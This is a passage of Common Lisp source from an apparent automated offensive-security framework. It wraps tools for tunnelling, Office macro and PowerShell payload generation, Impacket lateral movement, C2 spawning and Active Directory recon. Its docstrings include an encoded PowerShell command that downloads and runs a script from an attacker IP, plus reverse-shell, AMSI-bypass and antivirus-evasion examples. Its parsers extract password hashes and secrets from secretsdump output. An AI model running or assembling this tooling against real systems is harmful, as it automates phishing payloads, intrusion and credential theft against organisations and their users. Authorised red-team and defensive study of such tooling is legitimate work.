  (make-ligolo-ng-agent :agent \"attacker-ip:11601\"
    :self-cert t)"))

(defun make-ligolo-ng-agent (mode listen-addr &key (self-cert t)
                                                      (lport 11601)
                                                      (tun-interface "ligolo")
                                                      agent-iface
                                                      socks5-addr)
  "Create a Ligolo-ng tunnel/pivot agent.

Parameters:
  MODE          — :PROXY or :AGENT (required).
  LISTEN-ADDR   — Listen/connect address host:port (required).
  SELF-CERT     — If T, auto-generate self-signed certs (default).
  LPORT         — Proxy listen port for agents (proxy mode, default 11601).
  TUN-INTERFACE — TUN device name (proxy mode, default \"ligolo\").
  AGENT-IFACE   — Agent interface for auto-mode (optional).
  SOCKS5-ADDR   — Enable SOCKS5 on this address (proxy mode, optional).

Returns: A configured LIGOLO-NG-AGENT instance.

Install Ligolo-ng from: https://github.com/nicocha30/ligolo-ng

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "ligolo-ng")
                     (find-kali-binary "ligolo")
                     (warn "[TUNNEL] ligolo-ng not found. Install from: https://github.com/nicocha30/ligolo-ng")))
         (mode-str (if (eq mode :proxy) "proxy" "agent"))
         (args (append
                (list (concatenate 'string "-" mode-str))
                (when self-cert (list "-selfcert"))
                (when (eq mode :proxy)
                  (list "-laddr" listen-addr)
                  (list "-lport" (princ-to-string lport)))
                (when (and (eq mode :proxy) socks5-addr)
                  (list "-socks5" socks5-addr))
                (when (eq mode :agent)
                  (list "-connect" listen-addr))
                (when agent-iface (list "-bind" agent-iface)))))
    (let ((agent (make-instance 'ligolo-ng-agent
                                :binary (or binary "ligolo-ng")
                                :args args
                                :tool-category :exploit
                                :target listen-addr
                                :mode mode
                                :listen-addr listen-addr
                                :self-cert self-cert
                                :lport lport
                                :tun-interface tun-interface
                                :agent-iface agent-iface
                                :socks5-addr socks5-addr
                                :capabilities '(:tunneling :pivoting
                                                :tun-interface :layer3-tunnel
                                                :udp-tunnel :icmp-tunnel
                                                :multi-agent :vpn-like)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *tunnel-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.6: Payload Generation Agents
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Payload generation agents create malicious payloads for initial access,
;; including MS Office macros, PowerShell scripts, and other delivery vectors.

;; ───────────────────────────────────────────────────────────────────────────
;; O.6.1  macro-pack-agent — MS Office Document Payload Generator
;; ───────────────────────────────────────────────────────────────────────────

(defclass macro-pack-agent (kali-agent)
  ((payload-type :initarg :payload-type
                 :accessor mp-payload-type
                 :documentation
                 "Type of Office payload to generate. One of:
            :DDE         — DDE (Dynamic Data Exchange) formula
            :EMBED       — Embedded executable in document
            :MACRO       — VBA macro payload
            :XLS         — Excel-specific payload
            :PPT         — PowerPoint-specific payload
            :DOC         — Word-specific payload")
   (output :initarg :output
           :accessor mp-output
           :documentation
           "Output file path for the generated document.
            Example: '/tmp/payload.doc'")
   (template :initarg :template
             :initform nil
             :accessor mp-template
             :documentation
             "Template file to base the payload on (optional).
            The payload will be injected into the template document.")
   (obfuscate :initarg :obfuscate
              :initform t
              :accessor mp-obfuscate
              :documentation
              "If T, apply VBA obfuscation to evade AV detection.")
   (command :initarg :command
            :initform nil
            :accessor mp-command
            :documentation
            "Command to execute when the document is opened.
            Overrides default payload generation.")
   (listen-port :initarg :listen-port
                :initform 80
                :accessor mp-listen-port
                :documentation
                "Listen port for reverse connection payloads."))
  (:documentation
   "macro_pack — MS Office payload generator for social engineering.

macro_pack is a tool by @EmericNasi for generating malicious MS Office
documents with various payload types. It supports multiple infection
vectors and output formats for red-team phishing engagements.

Supported payload types:
  :DDE    — Dynamic Data Exchange formula (no macro warning)
  :EMBED  — Embedded executable triggered by DDE or macro
  :MACRO  — Traditional VBA macro (with auto-open trigger)
  :XLS    — Excel-specific (worksheet macro + formula)
  :PPT    — PowerPoint-specific (action settings + macro)
  :DOC    — Word-specific (auto-open macro + DDE)

Obfuscation features:
  • Variable name randomization
  • String encoding/encryption
  • Dead code insertion
  • VBA module splitting
  • Anti-analysis techniques

The generated documents can be delivered via phishing email, shared
folders, or USB drops for initial access during red-team operations.

Example:
  ;; Generate obfuscated Word macro payload
  (make-macro-pack-agent :macro \"/tmp/report.doc\"
    :command \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA\"
    :obfuscate t)

  ;; DDE payload (no macro security warning)
  (make-macro-pack-agent :dde \"/tmp/invoices.xlsx\"
    :command \"cmd.exe /c powershell.exe -WindowStyle hidden -enc ...\"
    :obfuscate t)"))

(defun make-macro-pack-agent (payload-type output &key template
                                                        (obfuscate t)
                                                        command
                                                        (listen-port 80))
  "Create a macro_pack MS Office payload generation agent.

Parameters:
  PAYLOAD-TYPE — Document type: :DDE, :EMBED, :MACRO, :XLS, :PPT, :DOC (required).
  OUTPUT       — Output file path (required).
  TEMPLATE     — Template document to inject into (optional).
  OBFUSCATE    — If T, apply VBA obfuscation (default).
  COMMAND      — Command to execute on document open (optional).
  LISTEN-PORT  — Listen port for reverse payloads (default 80).

Returns: A configured MACRO-PACK-AGENT instance.

Install macro_pack from: https://github.com/sevagas/macro_pack
Or: pip install macro_pack

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "macro_pack.py")
                     (find-kali-binary "macro_pack")
                     (warn "[PAYLOAD] macro_pack not found. Install from: https://github.com/sevagas/macro_pack")))
         (payload-str (case payload-type
                        (:dde "dde")
                        (:embed "embed")
                        (:macro "macro")
                        (:xls "xls")
                        (:ppt "ppt")
                        (:doc "doc")
                        (t "macro")))
         (args (append
                (list "-t" payload-str)
                (list "-o" output)
                (when template (list "--template" template))
                (when obfuscate (list "--obfuscate"))
                (when command (list "--command" command))
                (list "-lport" (princ-to-string listen-port)))))
    (let ((agent (make-instance 'macro-pack-agent
                                :binary (or binary "macro_pack.py")
                                :args args
                                :tool-category :social
                                :target output
                                :payload-type payload-type
                                :output output
                                :template template
                                :obfuscate obfuscate
                                :command command
                                :listen-port listen-port
                                :capabilities '(:payload-generation :office-payload
                                                :macro-obfuscation :social-engineering
                                                :phishing :initial-access)
                                :timeout 120
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *payload-gen-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.6.2  unicorn-agent — PowerShell Downgrade Attack / Payload Generator
;; ───────────────────────────────────────────────────────────────────────────

(defclass unicorn-agent (kali-agent)
  ((payload :initarg :payload
            :accessor uni-payload
            :documentation
            "Payload type to generate. One of:
            :POWERSHELL   — PowerShell-based reverse shell
            :MACRO        — MS Office macro with PowerShell payload
            :HTA          — HTML Application payload
            :CERTUTIL    — certutil-based payload delivery
            :DDE          — DDE attack vector payload")
   (ip :initarg :ip
       :accessor uni-ip
       :documentation
       "Attacker IP address for reverse shell callback.")
   (port :initarg :port
         :accessor uni-port
         :documentation
         "Attacker port for reverse shell listener.")
   (outfile :initarg :outfile
            :initform nil
            :accessor uni-outfile
            :documentation
            "Output file for generated payload (optional).
            If nil, output is captured from stdout.")
   (downgrade :initarg :downgrade
              :initform t
              :accessor uni-downgrade
              :documentation
              "If T, include PowerShell version 2 downgrade command.
            Forces PowerShell to run in version 2 mode, bypassing
            many modern logging and AMSI protections."))
  (:documentation
   "Unicorn — PowerShell downgrade attack and payload generator.

Unicorn is a simple tool for using a PowerShell downgrade attack and
injecting shellcode straight into memory. Created by @TrustedSec, it
combines multiple techniques to evade endpoint protection:

Techniques employed:
  • PowerShell downgrade attack — forces PowerShell v2 which lacks:
    - Script Block Logging
    - Transcription Logging
    - AMSI (Antimalware Scan Interface)
    - Constrained Language Mode
  • Direct shellcode injection into memory
  • Reflective DLL loading
  • AMSI bypass via memory patching
  • ETW (Event Tracing for Windows) bypass

Payload types:
  :POWERSHELL — PowerShell command with embedded shellcode
  :MACRO      — VBA macro that launches PowerShell payload
  :HTA        — HTML Application for browser-based delivery
  :CERTUTIL   — Uses certutil.exe to download and execute payload
  :DDE        — DDE formula for Office-based delivery

The generated payloads are one-liners designed for copy-paste into
various delivery vectors: phishing email, USB drop, compromised website,
or direct command execution.

Example:
  ;; PowerShell reverse shell
  (make-unicorn-agent :powershell \"192.168.1.50\" 4444
    :outfile \"/tmp/unicorn-payload.ps1\")

  ;; Office macro with AMSI bypass
  (make-unicorn-agent :macro \"192.168.1.50\" 4444
    :downgrade t
    :outfile \"/tmp/unicorn-macro.vba\")

  ;; HTA payload for browser delivery
  (make-unicorn-agent :hta \"192.168.1.50\" 4444)"))

(defun make-unicorn-agent (payload ip port &key outfile
                                                  (downgrade t))
  "Create a Unicorn payload generation agent.

Parameters:
  PAYLOAD   — Payload type: :POWERSHELL, :MACRO, :HTA, :CERTUTIL, :DDE (required).
  IP        — Attacker IP for reverse callback (required).
  PORT      — Attacker port for reverse listener (required).
  OUTFILE   — Output file path (optional).
  DOWNGRADE — If T, include PowerShell v2 downgrade (default).

Returns: A configured UNICORN-AGENT instance.

Install Unicorn from: https://github.com/TrustedSec/unicorn

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "unicorn.py")
                     (find-kali-binary "unicorn")
                     (warn "[PAYLOAD] unicorn not found. Install from: https://github.com/TrustedSec/unicorn")))
         (payload-str (case payload
                        (:powershell "powershell")
                        (:macro "macro")
                        (:hta "hta")
                        (:certutil "certutil")
                        (:dde "dde")
                        (t "powershell")))
         (args (append
                (list payload-str ip (princ-to-string port))
                (when outfile (list ">" outfile))
                (when downgrade (list "--downgrade")))))
    (let ((agent (make-instance 'unicorn-agent
                                :binary (or binary "unicorn.py")
                                :args args
                                :tool-category :social
                                :target (format nil "~A:~D" ip port)
                                :payload payload
                                :ip ip
                                :port port
                                :outfile outfile
                                :downgrade downgrade
                                :capabilities '(:payload-generation
                                                :powershell-downgrade
                                                :amsi-bypass :etw-bypass
                                                :shellcode-injection
                                                :memory-injection
                                                :initial-access)
                                :timeout 120
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *payload-gen-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))



;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.7: Registry Management — Lookup, Listing, and Lifecycle
;; ═══════════════════════════════════════════════════════════════════════════

(defun lookup-impacket-agent (agent-id)
  "Look up an Impacket agent by its agent ID.

Parameters:
  AGENT-ID — The agent's unique identifier (symbol or string).

Returns: The IMPACKET-*-AGENT instance, or NIL if not found.

Thread-safety: Lock-protected read."
  (bt:with-lock-held (*offensive-registry-lock*)
    (gethash (if (symbolp agent-id) agent-id (intern (string-upcase agent-id)))
             *impacket-agent-registry*)))

(defun lookup-c2-agent (agent-id)
  "Look up a C2 framework agent by its agent ID.

Parameters:
  AGENT-ID — The agent's unique identifier (symbol or string).

Returns: The C2-*-AGENT instance, or NIL if not found.

Thread-safety: Lock-protected read."
  (bt:with-lock-held (*offensive-registry-lock*)
    (gethash (if (symbolp agent-id) agent-id (intern (string-upcase agent-id)))
             *c2-agent-registry*)))

(defun lookup-ad-recon-agent (agent-id)
  "Look up an AD reconnaissance agent by its agent ID.

Parameters:
  AGENT-ID — The agent's unique identifier (symbol or string).

Returns: The BLOODHOUND-*-AGENT or SHARPHOUND-AGENT instance, or NIL."
  (bt:with-lock-held (*offensive-registry-lock*)
    (gethash (if (symbolp agent-id) agent-id (intern (string-upcase agent-id)))
             *ad-recon-agent-registry*)))

(defun lookup-tunnel-agent (agent-id)
  "Look up a tunneling agent by its agent ID.

Parameters:
  AGENT-ID — The agent's unique identifier (symbol or string).

Returns: The CHISEL-AGENT or LIGOLO-NG-AGENT instance, or NIL."
  (bt:with-lock-held (*offensive-registry-lock*)
    (gethash (if (symbolp agent-id) agent-id (intern (string-upcase agent-id)))
             *tunnel-agent-registry*)))

(defun lookup-payload-gen-agent (agent-id)
  "Look up a payload generation agent by its agent ID.

Parameters:
  AGENT-ID — The agent's unique identifier (symbol or string).

Returns: The MACRO-PACK-AGENT or UNICORN-AGENT instance, or NIL."
  (bt:with-lock-held (*offensive-registry-lock*)
    (gethash (if (symbolp agent-id) agent-id (intern (string-upcase agent-id)))
             *payload-gen-agent-registry*)))

(defun list-impacket-agents ()
  "List all registered Impacket suite agents.

Returns: A list of all active IMPACKET-*-AGENT instances currently
  registered in *impacket-agent-registry*.

Thread-safety: Lock-protected read. The returned list is a fresh
  copy; modifying it does not affect the registry."
  (bt:with-lock-held (*offensive-registry-lock*)
    (let ((agents '()))
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (push agent agents))
               *impacket-agent-registry*)
      (nreverse agents))))

(defun list-c2-agents ()
  "List all registered C2 framework agents.

Returns: A list of all active C2-*-AGENT instances currently
  registered in *c2-agent-registry*.

Covers: Sliver, Havoc, Empire, Covenant, PoshC2, Mythic, Metasploit-Enhanced.

Thread-safety: Lock-protected read. The returned list is a fresh copy."
  (bt:with-lock-held (*offensive-registry-lock*)
    (let ((agents '()))
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (push agent agents))
               *c2-agent-registry*)
      (nreverse agents))))

(defun list-ad-recon-agents ()
  "List all registered AD reconnaissance agents.

Returns: A list of all active BLOODHOUND-* and SHARPHOUND-AGENT instances.

Thread-safety: Lock-protected read. The returned list is a fresh copy."
  (bt:with-lock-held (*offensive-registry-lock*)
    (let ((agents '()))
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (push agent agents))
               *ad-recon-agent-registry*)
      (nreverse agents))))

(defun list-tunnel-agents ()
  "List all registered tunneling/pivot agents.

Returns: A list of all active CHISEL-AGENT and LIGOLO-NG-AGENT instances.

Thread-safety: Lock-protected read. The returned list is a fresh copy."
  (bt:with-lock-held (*offensive-registry-lock*)
    (let ((agents '()))
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (push agent agents))
               *tunnel-agent-registry*)
      (nreverse agents))))

(defun list-payload-gen-agents ()
  "List all registered payload generation agents.

Returns: A list of all active MACRO-PACK-AGENT and UNICORN-AGENT instances.

Thread-safety: Lock-protected read. The returned list is a fresh copy."
  (bt:with-lock-held (*offensive-registry-lock*)
    (let ((agents '()))
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (push agent agents))
               *payload-gen-agent-registry*)
      (nreverse agents))))

(defun count-offensive-agents ()
  "Count agents across all offensive subsystems.

Returns: A plist with counts for each subsystem:
  (:impacket N :c2 N :ad-recon N :tunnel N :payload-gen N :total N)

Thread-safety: Lock-protected read across all registries."
  (bt:with-lock-held (*offensive-registry-lock*)
    (let ((impacket (hash-table-count *impacket-agent-registry*))
          (c2 (hash-table-count *c2-agent-registry*))
          (ad-recon (hash-table-count *ad-recon-agent-registry*))
          (tunnel (hash-table-count *tunnel-agent-registry*))
          (payload-gen (hash-table-count *payload-gen-agent-registry*)))
      `(:impacket ,impacket
        :c2 ,c2
        :ad-recon ,ad-recon
        :tunnel ,tunnel
        :payload-gen ,payload-gen
        :total ,(+ impacket c2 ad-recon tunnel payload-gen)))))

(defun offensive-subsystem-status ()
  "Report comprehensive status of the offensive subsystem.

Returns: A plist with detailed status information:
  (:impacket (:count N :agents (id1 id2 ...))
   :c2 (:count N :agents (id1 id2 ...))
   :ad-recon (:count N :agents (id1 id2 ...))
   :tunnel (:count N :agents (id1 id2 ...))
   :payload-gen (:count N :agents (id1 id2 ...))
   :total N
   :gossip-topics (:swarm.kali.impacket :swarm.kali.c2 ...))

Useful for REPL inspection and dashboard displays."
  (flet ((agent-ids (registry)
           (let ((ids '()))
             (maphash (lambda (id agent)
                        (declare (ignore agent))
                        (push id ids))
                      registry)
             (nreverse ids))))
    (bt:with-lock-held (*offensive-registry-lock*)
      (let ((impacket (hash-table-count *impacket-agent-registry*))
            (c2 (hash-table-count *c2-agent-registry*))
            (ad-recon (hash-table-count *ad-recon-agent-registry*))
            (tunnel (hash-table-count *tunnel-agent-registry*))
            (payload-gen (hash-table-count *payload-gen-agent-registry*)))
        `(:impacket (:count ,impacket
                     :agents ,(agent-ids *impacket-agent-registry*)
                     :tools (psexec wmiexec secretsdump smbexec
                            atexec dcomexec samrdump mqttexec))
          :c2 (:count ,c2
               :agents ,(agent-ids *c2-agent-registry*)
               :frameworks (sliver havoc empire covenant poshc2 mythic metasploit))
          :ad-recon (:count ,ad-recon
                     :agents ,(agent-ids *ad-recon-agent-registry*)
                     :tools (bloodhound-python sharphound))
          :tunnel (:count ,tunnel
                   :agents ,(agent-ids *tunnel-agent-registry*)
                   :tools (chisel ligolo-ng))
          :payload-gen (:count ,payload-gen
                        :agents ,(agent-ids *payload-gen-agent-registry*)
                        :tools (macro_pack unicorn))
          :total ,(+ impacket c2 ad-recon tunnel payload-gen)
          :gossip-topics ,*offensive-gossip-topics*)))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.8: Interactive REPL Spawn Commands
;; ═══════════════════════════════════════════════════════════════════════════

(defun spawn-impacket-suite (tool target &rest kwargs)
  "REPL command: spawn any Impacket tool agent.

TOOL   — Tool name: :psexec, :wmiexec, :secretsdump, :smbexec,
         :atexec, :dcomexec, :samrdump, or :mqttexec.
TARGET — Target host IP or hostname.
KWARGS — Additional keyword arguments passed to the specific tool's
         constructor (e.g., :username, :password, :hashes, :command).

Returns: The spawned agent instance.

Example:
  (spawn-impacket-suite :psexec \"192.168.1.10\"
    :username \"Administrator\"
    :password \"P@ssw0rd\"
    :command \"whoami /all\")

  (spawn-impacket-suite :secretsdump \"dc01.corp.local\"
    :username \"CORP\\admin\"
    :hashes \"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\"
    :ntds t :sam t :history t)"
  (let ((agent (case tool
                 (:psexec
                  (apply #'make-impacket-psexec-agent target kwargs))
                 (:wmiexec
                  (apply #'make-impacket-wmiexec-agent target kwargs))
                 (:secretsdump
                  (apply #'make-impacket-secretsdump-agent target kwargs))
                 (:smbexec
                  (apply #'make-impacket-smbexec-agent target kwargs))
                 (:atexec
                  (apply #'make-impacket-atexec-agent target kwargs))
                 (:dcomexec
                  (apply #'make-impacket-dcomexec-agent target kwargs))
                 (:samrdump
                  (apply #'make-impacket-samrdump-agent target kwargs))
                 (:mqttexec
                  (apply #'make-impacket-mqttexec-agent target kwargs))
                 (otherwise
                  (error "[IMPACKET] Unknown tool: ~A. Valid tools: ~A"
                         tool '(:psexec :wmiexec :secretsdump :smbexec
                               :atexec :dcomexec :samrdump :mqttexec))))))
    (when agent
      (run-tool agent)
      (format t "[IMPACKET] Spawned ~A agent ~A targeting ~A~%"
              tool (agent-id agent) target))
    agent))

(defun spawn-c2 (framework &rest kwargs)
  "REPL command: spawn a C2 framework agent.

FRAMEWORK — C2 framework name: :sliver, :havoc, :empire, :covenant,
            :poshc2, :mythic, or :metasploit.
KWARGS    — Keyword arguments passed to the specific framework's
            constructor.

Returns: The spawned agent instance.

Example:
  (spawn-c2 :sliver
    :implant-name \"IMPLANT-WIN-01\"
    :config \"~/.sliver-client/configs/op.cfg\")

  (spawn-c2 :havoc
    :profile \"/opt/havoc/profiles/http.yaml\"
    :listener \"http-01\"
    :server-addr \"10.0.0.5:40056\")"
  (let ((agent (case framework
                 (:sliver
                  (apply #'make-sliver-agent kwargs))
                 (:havoc
                  (apply #'make-havoc-agent kwargs))
                 (:empire
                  (apply #'make-empire-agent kwargs))
                 (:covenant
                  (apply #'make-covenant-agent kwargs))
                 (:poshc2
                  (apply #'make-poshc2-agent kwargs))
                 (:mythic
                  (apply #'make-mythic-agent kwargs))
                 (:metasploit
                  (apply #'make-metasploit-enhanced-agent kwargs))
                 (otherwise
                  (error "[C2] Unknown framework: ~A. Valid frameworks: ~A"
                         framework '(:sliver :havoc :empire :covenant
                                    :poshc2 :mythic :metasploit))))))
    (when agent
      (run-tool agent)
      (format t "[C2] Spawned ~A agent ~A~%"
              framework (agent-id agent)))
    agent))

(defun spawn-tunnel (tool mode &rest kwargs)
  "REPL command: spawn a tunneling/pivot agent.

TOOL   — Tunneling tool: :chisel or :ligolo-ng.
MODE   — Operating mode:
         For :chisel:    :server or :client
         For :ligolo-ng: :proxy or :agent
KWARGS — Additional keyword arguments for the tool constructor.

Returns: The spawned agent instance.

Example:
  ;; Chisel server on pivot host
  (spawn-tunnel :chisel :server \"0.0.0.0:8080\"
    :auth \"redteam:secret\"
    :reverse t)

  ;; Ligolo-ng proxy (attacker side, requires root)
  (spawn-tunnel :ligolo-ng :proxy \"0.0.0.0:11601\"
    :tun-interface \"ligolo\"
    :socks5-addr \"127.0.0.1:1080\")"
  (let ((agent (case tool
                 (:chisel
                  (apply #'make-chisel-agent mode kwargs))
                 (:ligolo-ng
                  (apply #'make-ligolo-ng-agent mode kwargs))
                 (otherwise
                  (error "[TUNNEL] Unknown tool: ~A. Valid tools: ~A"
                         tool '(:chisel :ligolo-ng))))))
    (when agent
      (run-tool agent)
      (format t "[TUNNEL] Spawned ~A (~A mode) agent ~A~%"
              tool mode (agent-id agent)))
    agent))

(defun spawn-payload-gen (tool &rest kwargs)
  "REPL command: spawn a payload generation agent.

TOOL   — Payload generator: :macro-pack or :unicorn.
KWARGS — Keyword arguments passed to the specific tool constructor.

Returns: The spawned agent instance.

Example:
  ;; Generate obfuscated Word macro
  (spawn-payload-gen :macro-pack
    :payload-type :macro
    :output \"/tmp/payload.doc\"
    :command \"powershell -enc ...\"
    :obfuscate t)

  ;; Unicorn PowerShell reverse shell
  (spawn-payload-gen :unicorn
    :payload :powershell
    :ip \"192.168.1.50\"
    :port 4444
    :outfile \"/tmp/unicorn.ps1\")"
  (let ((agent (case tool
                 (:macro-pack
                  (apply #'make-macro-pack-agent kwargs))
                 (:unicorn
                  (apply #'make-unicorn-agent kwargs))
                 (otherwise
                  (error "[PAYLOAD-GEN] Unknown tool: ~A. Valid tools: ~A"
                         tool '(:macro-pack :unicorn))))))
    (when agent
      (run-tool agent)
      (format t "[PAYLOAD-GEN] Spawned ~A agent ~A~%"
              tool (agent-id agent)))
    agent))

(defun spawn-ad-recon (tool domain &rest kwargs)
  "REPL command: spawn an AD reconnaissance agent.

TOOL   — AD recon tool: :bloodhound-python or :sharphound.
DOMAIN — Active Directory domain to enumerate.
KWARGS — Additional keyword arguments for the tool constructor.

Returns: The spawned agent instance.

Example:
  (spawn-ad-recon :bloodhound-python \"corp.local\"
    :username \"jsmith\"
    :password \"P@ssw0rd\"
    :collection-method :all
    :output-prefix \"/tmp/corp-bh\")

  (spawn-ad-recon :sharphound \"corp.local\"
    :collection-method :all
    :output-directory \"/tmp/sharphound\")"
  (let ((agent (case tool
                 (:bloodhound-python
                  (apply #'make-bloodhound-python-agent domain kwargs))
                 (:sharphound
                  (apply #'make-sharphound-agent domain kwargs))
                 (otherwise
                  (error "[AD-RECON] Unknown tool: ~A. Valid tools: ~A"
                         tool '(:bloodhound-python :sharphound))))))
    (when agent
      (run-tool agent)
      (format t "[AD-RECON] Spawned ~A agent ~A targeting ~A~%"
              tool (agent-id agent) domain))
    agent))

(defun list-all-offensive-agents ()
  "List all agents across all offensive subsystems.

Returns: A plist categorizing all active offensive agents:
  (:impacket (agent1 agent2 ...) :c2 (...) :ad-recon (...)
   :tunnel (...) :payload-gen (...))

Useful for getting a complete view of the offensive operational state."
  `(:impacket ,(list-impacket-agents)
    :c2 ,(list-c2-agents)
    :ad-recon ,(list-ad-recon-agents)
    :tunnel ,(list-tunnel-agents)
    :payload-gen ,(list-payload-gen-agents)))

(defun halt-all-offensive-agents ()
  "Gracefully stop ALL offensive subsystem agents.

This function iterates through all five offensive registries and calls
STOP-TOOL on each registered agent. Use with caution — this terminates
all Impacket operations, C2 sessions, AD recon, tunnels, and payload
generation in progress.

Returns: A count of halted agents per subsystem as a plist.

Example:
  (halt-all-offensive-agents)
  → (:impacket 2 :c2 1 :ad-recon 0 :tunnel 1 :payload-gen 0 :total 4)"
  (let ((counts '()))
    (flet ((halt-registry (registry name)
             (let ((count 0))
               (maphash (lambda (id agent)
                          (declare (ignore id))
                          (ignore-errors (stop-tool agent))
                          (incf count))
                        registry)
               (push name counts)
               (push count counts)
               count)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (halt-registry *impacket-agent-registry* :impacket)
        (halt-registry *c2-agent-registry* :c2)
        (halt-registry *ad-recon-agent-registry* :ad-recon)
        (halt-registry *tunnel-agent-registry* :tunnel)
        (halt-registry *payload-gen-agent-registry* :payload-gen))
      (append (nreverse counts)
              (list :total (apply #'+ (loop for c on (nreverse counts)
                                           when (numberp (car c)) collect (car c))))))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.9: Parse-Findings Methods — Offensive Tool Output Parsing
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; These methods extend the generic PARSE-FINDINGS to extract structured
;; intelligence from offensive tool output. Each method is registered as
;; an :AFTER method on the respective agent subclass.

(defmethod parse-findings :after ((agent impacket-psexec-agent) line)
  "Parse psexec output for command execution results.

Detects:
  • Command output lines (whoami, net user, etc.)
  • Service creation/deletion status
  • Authentication success/failure indicators"
  (let ((findings '()))
    ;; Service creation confirmation
    (when (cl-ppcre:scan "Installing service" line)
      (push `(:type :psexec-service-created
              :tool :psexec
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Service removal confirmation
    (when (cl-ppcre:scan "Removing service" line)
      (push `(:type :psexec-service-removed
              :tool :psexec
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Authentication failure
    (when (cl-ppcre:scan "(LOGON_FAILURE|STATUS_LOGON_FAILURE)" line)
      (push `(:type :authentication-failed
              :tool :psexec
              :target ,(impacket-target agent)
              :username ,(impacket-username agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Access denied
    (when (cl-ppcre:scan "(ACCESS_DENIED|STATUS_ACCESS_DENIED)" line)
      (push `(:type :access-denied
              :tool :psexec
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-wmiexec-agent) line)
  "Parse wmiexec output for WMI execution indicators.

Detects:
  • WMI command execution confirmation
  • DCOM connection status
  • Output file retrieval status"
  (let ((findings '()))
    ;; DCOM connection established
    (when (cl-ppcre:scan "Impacket for WMI Execution" line)
      (push `(:type :wmiexec-connected
              :tool :wmiexec
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Command execution indicator
    (when (cl-ppcre:scan "(Executed command|Command executed)" line)
      (push `(:type :wmi-command-executed
              :tool :wmiexec
              :target ,(impacket-target agent)
              :command ,(impacket-command agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-secretsdump-agent) line)
  "Parse secretsdump output for credential extraction results.

Detects:
  • NTDS.dit hash extraction
  • SAM hash extraction
  • LSA secret decryption
  • Machine account hashes
  • Password history entries

This is one of the most important parsers — it extracts actual credentials
that can be used for further lateral movement."
  (let ((findings '()))
    ;; NTDS.dit hash: RID:aad3b435b51404eeaad3b435b51404ee:hash::: (status)
    (when (cl-ppcre:scan "^\\d+:[a-f0-9]{32}:[a-f0-9]{32}:" line)
      (cl-ppcre:register-groups-bind (rid lmhash nthash)
          ("^(\\d+):([a-f0-9]{32}):([a-f0-9]{32}):" line)
        (push `(:type :ntds-hash-extracted
                :tool :secretsdump
                :target ,(impacket-target agent)
                :rid ,rid
                :lmhash ,lmhash
                :nthash ,nthash
                :raw ,line
                :timestamp ,(local-time:now))
              findings)))
    ;; SAM hash: Username:RID:LMHASH:NTHASH:::
    (when (cl-ppcre:scan "^[^:]+:\\d+:[a-f0-9]{32}:[a-f0-9]{32}:" line)
      (cl-ppcre:register-groups-bind (username rid lmhash nthash)
          ("^([^:]+):(\\d+):([a-f0-9]{32}):([a-f0-9]{32}):" line)
        (push `(:type :sam-hash-extracted
                :tool :secretsdump
                :target ,(impacket-target agent)
                :username ,username
                :rid ,rid
                :lmhash ,lmhash
                :nthash ,nthash
                :raw ,line
                :timestamp ,(local-time:now))
              findings)))
    ;; LSA Secret: SecretName -> value
    (when (cl-ppcre:scan "^\\$\\w+ -> " line)
      (cl-ppcre:register-groups-bind (secret-name value)
          ("^\\$\\$(\\w+) -> (.+)" line)
        (push `(:type :lsa-secret-extracted
                :tool :secretsdump
                :target ,(impacket-target agent)
                :secret-name ,secret-name
                :value ,(string-trim " " value)
                :raw ,line
                :timestamp ,(local-time:now))
              findings)))
    ;; Password history: _history_RID:hash
    (when (and (impacket-history agent)
               (cl-ppcre:scan "_history_\\d+:" line))
      (push `(:type :password-history-extracted
              :tool :secretsdump
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    ;; Cached credential: $DCC2$ iterations#username#hash
    (when (cl-ppcre:scan "\\$DCC2\\$" line)
      (push `(:type :cached-credential-extracted
              :tool :secretsdump
              :target ,(impacket-target agent)
              :raw ,line
              :timestamp ,(local-time:now))
            findings))
    (nreverse findings)))

(defmethod parse-findings :after ((agent impacket-smbexec-agent) line)
  "Parse smbexec output for SMB pipe execution results."
  (let ((findings '()))
